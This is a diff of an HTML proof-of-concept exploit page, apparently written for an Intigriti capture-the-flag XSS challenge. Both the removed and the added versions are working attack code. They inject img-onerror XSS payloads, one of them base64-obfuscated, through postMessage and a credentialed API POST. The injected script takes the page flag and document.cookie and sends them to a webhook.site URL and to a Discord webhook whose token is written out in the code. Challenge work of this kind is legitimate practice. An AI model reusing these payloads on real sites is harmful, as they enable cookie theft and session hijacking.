@@ -1,89 +1,32 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Exploit</title>
-</head>
-<body style="background-color: #1a1a1a; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
+<html>
+<head><title>PoC</title></head>
+<body>
+<h1>XSS PoC</h1>
+<script>
+async function pwn() {
+  // XSS payload to exfiltrate flag from page
+  const xss = `<img src=x onerror="
+    const flag = document.body.innerHTML.match(/INTIGRITI{[^}]+}/);
+    if (flag) fetch('https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d/?f='+flag[0]);
+  ">`;
 
-    <h1>Exploit Running</h1>
-    <p>Please wait...</p>
-    <div id="log" style="font-family: monospace; color: #ccc;">Initializing...</div>
-    
-    <iframe id="targetFrame" src="https://challenge-0126.intigriti.io/checkout.html" style="width:800px; height:600px; border:2px solid #00FF88; margin-top: 20px;"></iframe>
+  // Inject XSS via wallet API
+  await fetch('https://challenge-0126.intigriti.io/api/wallets', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      currency: 'BTC',
+      address: xss,
+      balance: 1
+    })
+  });
 
-    <script>
-        const WEBHOOK_URL = "https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d";
-        const DISCORD_URL = "https://discord.com/api/webhooks/1463231849550581891/xi0StB5ZOeisP2iDil0iuOYJzYhT6SYt4L4WWrEzgLqmJjSl0N5xyhrgX0zrjAq7q9o0";
-        const MARKETWATCH_URL = "https://challenge-0126.intigriti.io/marketwatch.html";
-
-        function log(msg) { document.getElementById("log").innerText = msg; }
-
-        const exfilScript = `
-            var hook = "${WEBHOOK_URL}";
-            var discord = "${DISCORD_URL}";
-            
-            new Image().src = hook + "?type=xss_fired";
-
-            function sendDiscord(msg) {
-                var d = JSON.stringify({username:"FlagBot", content: msg});
-                var b = new Blob([d],{type:'application/json'});
-                navigator.sendBeacon(discord, b);
-            }
-
-            fetch('/checkout.html')
-            .then(r => r.text())
-            .then(html => {
-                var flag = "FLAG_NOT_FOUND";
-                if(html.indexOf("FLAG:") > -1) { 
-                    flag = html.substring(html.indexOf("FLAG:"), html.indexOf("FLAG:") + 60);
-                }
-                var cookies = document.cookie;
-                
-                var d = new FormData();
-                d.append('flag', flag);
-                d.append('cookie', cookies);
-                navigator.sendBeacon(hook + "?type=data", d);
-                
-                sendDiscord("FLAG CAPTURED: " + flag);
-            })
-            .catch(e => {
-                new Image().src = hook + "?type=error&msg=" + btoa(e.toString());
-            });
-        `;
-
-        const base64Exfil = btoa(exfilScript);
-        const xssPayload = `0x"><img src=x onerror=eval(atob('${base64Exfil}'))>`;
-
-        document.getElementById('targetFrame').onload = function() {
-            log("Iframe loaded. Sending payloads...");
-            
-            var win = this.contentWindow;
-            var attempts = 0;
-            
-            var interval = setInterval(() => {
-                attempts++;
-                
-                var curr = (attempts % 2 === 0) ? "1337COIN" : "BTC";
-
-                win.postMessage({
-                    type: "submitTransaction",
-                    transaction: {
-                        currency: curr,
-                        amount: 1337,
-                        toAddress: xssPayload
-                    }
-                }, "*");
-
-                if (attempts % 5 === 0) log("Sent " + attempts + " payloads...");
-
-                if (attempts > 15) {
-                    clearInterval(interval);
-                    log("Redirecting Iframe...");
-                    win.location = MARKETWATCH_URL;
-                }
-            }, 500);
-        };
-    </script>
+  // Navigate to dashboard to trigger XSS
+  window.location = 'https://challenge-0126.intigriti.io/dashboard.html';
+}
+pwn();
+</script>
 </body>
 </html>
